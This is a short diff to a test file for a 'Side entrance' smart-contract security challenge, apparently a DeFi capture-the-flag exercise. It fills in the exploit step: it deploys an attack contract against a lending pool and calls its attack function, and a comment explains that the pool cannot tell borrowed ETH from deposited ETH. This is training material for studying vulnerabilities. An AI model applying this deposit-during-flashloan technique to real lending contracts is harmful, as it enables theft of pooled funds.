@@ -25,6 +25,12 @@ describe('[Challenge] Side entrance', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        //because the Lending Pool allow us to deposit ETH it cannot (with the current implementation) know if those funds are from borrowed ETH or “normal” ETH. 
+        const SideAttack = await ethers.getContractFactory('AttackSideEntrance', attacker); 
+        this.sideAttack = await SideAttack.deploy(this.pool.address); 
+
+        this.sideAttack.connect(attacker).attack(); 
     });
 
     after(async function () {
